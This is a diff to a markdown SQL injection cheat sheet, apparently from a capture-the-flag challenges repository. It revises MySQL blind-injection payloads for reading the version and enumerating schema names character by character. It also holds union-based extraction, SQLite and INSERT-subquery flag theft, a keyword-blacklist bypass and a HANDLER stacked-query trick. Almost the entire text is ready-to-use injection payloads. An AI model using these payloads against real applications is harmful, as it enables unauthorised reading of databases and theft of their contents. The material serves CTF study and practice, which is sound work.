@@ -10,11 +10,17 @@
       - `admin' and (1=0)#` *return false*
       - `admin' and (1=1)#` *return true*
         
-  - Find version [code.py](https://github.com/ByamB4/Common-CTF-Challenges/blob/main/web/sqli/src/mysql_blind_get_version.py)
-      - `admin' and (SELECT LENGTH(VERSION())=6)#`
-      - `admin' and (SELECT ASCII(SUBSTRING(VERSION(),1,1))=53)#`
+  - Get version [code.py](https://github.com/ByamB4/Common-CTF-Challenges/blob/main/web/sqli/src/mysql_blind_get_version.py)
+      - `admin' and (SELECT LENGTH(VERSION())={guess})#`
+      - `admin' and (SELECT ASCII(SUBSTRING(VERSION(),1,1))={guess})#`
+
+  - Get schemas [code.py](https://github.com/ByamB4/Common-CTF-Challenges/blob/main/web/sqli/src/mysql_get_schemas.py)
+      - `admin' and (SELECT COUNT(*)={guess} total_schemas FROM information_schema.SCHEMATA)#`
+      - `admin' and (SELECT LENGTH((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA ORDER BY SCHEMA_NAME LIMIT 1 OFFSET {index}))={name_length})#`
+      - `admin' and (SELECT ASCII(SUBSTRING((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA ORDER BY SCHEMA_NAME LIMIT 1 OFFSET {schema_index}),{name_index},1))={ord(guess)})#`
 
 
+###
 - Extract number column
 
   - `'union select 1,2,3#`
@@ -46,14 +52,6 @@
 
   - `'union select <COLUMN_NAME>,'b','c' from <DATABASE_NAME>.<TABLE_NAME> where id='1'#`
 
-### Tricks
-
-  - Read data from column name
-    ```
-    1'; handler <COLUMN_NAME> open as `a`; handler `a` read next;#
-    ```
-
-
 ## SQLite
 - Extract previous query
   - `union select sql from sqlite_master`
@@ -70,8 +68,13 @@
 ### Insert
   - `INSERT INTO notes(username, notes) VALUES('admin', (SELECT flag FROM secret LIMIT 0,1)); -- -`
 
-### Tricks
+
+## Tricks
 
   - Bypass blacklist words
     - `ad'||'min`
 
+  - Read data from column name
+    ```
+    1'; handler <COLUMN_NAME> open as `a`; handler `a` read next;#
+    ```
